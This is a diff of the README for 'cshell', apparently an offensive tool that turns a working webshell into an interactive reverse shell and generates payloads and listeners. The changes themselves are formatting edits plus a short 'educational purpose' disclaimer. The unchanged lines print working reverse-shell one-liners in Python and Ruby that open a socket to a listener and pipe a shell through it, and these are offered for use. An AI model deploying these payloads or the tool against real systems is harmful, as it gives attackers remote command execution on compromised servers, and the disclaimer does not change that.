@@ -10,19 +10,19 @@ This script takes a working webshell as an argument and can perform the followin
   
 ## Install  
 - From PIP library :   
-  ```bash  
+  ```  
   pip3 install cshell  
   ```  
 - From Github :   
-  ```bash  
+  ```  
   git clone https://github.com/0z09e/cshell.git  
   cd cshell  
   sudo python3 setup.py install  
   ```  
     
-### Usage  
+## Usage  
 - **Help Menu :**  
-```bash  
+``` 
 $ cshell --help  
 usage: cshell.py [-h] [--payloads] {rev,web,lstnr} ...  
   
@@ -48,7 +48,7 @@ lstnr   Generate payload, copy it to your clipboard and start a listener[Optiona
 	- `cshell lstnr -f <Format> -i <Interface or IP>  -p <Port> -f <Payload format>`  
   
 
-### Custom Commands : 
+## Custom Commands : 
 - `help` - Help menu of custom commands  
 - `clear` - Clear the screen  
 - `exit` - Exit the shell  
@@ -56,8 +56,9 @@ lstnr   Generate payload, copy it to your clipboard and start a listener[Optiona
 - `download` - Download a file from the remote server  
 
 
-### Payloads  
-```bash  
+
+## Payloads  
+```
 $ cshell --payloads  
 ========================================================================================================  
 Format-Name                     Payload  
@@ -83,5 +84,6 @@ python3                         python3 -c 'import socket,subprocess,os;s=socket
 python3-export                  export RHOST="127.0.0.1";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")  
 ruby                            export RHOST=127.0.0.1;export RPORT=1337;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'  
 ```  
-
+## Disclaimer
+- Only for educational purpose, The creator of this tool won't be responsible to anything.
 
